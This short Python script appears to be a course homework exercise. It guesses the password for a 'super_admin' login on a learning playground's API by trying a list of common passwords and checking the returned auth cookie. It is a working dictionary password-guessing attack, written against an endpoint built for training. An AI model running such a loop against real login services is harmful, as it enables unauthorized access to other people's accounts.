import requests

url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"
list_of_passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
"123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome",
"888888", "princess", "dragon", "password1", "123qwe"]

for password in list_of_passwords:
    response1 = requests.post(url=url1, data={"login":login, "password":password})  # The first request to get auth_cookie
    cookie_value = response1.cookies.get('auth_cookie')
   # print(cookie_value)
    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post(url=url2, cookies=cookies)  # The second request to check auth_cookie
   # print(response2.text)
    answer = "You are NOT authorized"
    if answer in response2.text:
        print("Wrong password")
    else:
        print(response2.text, "Correct password =", password)



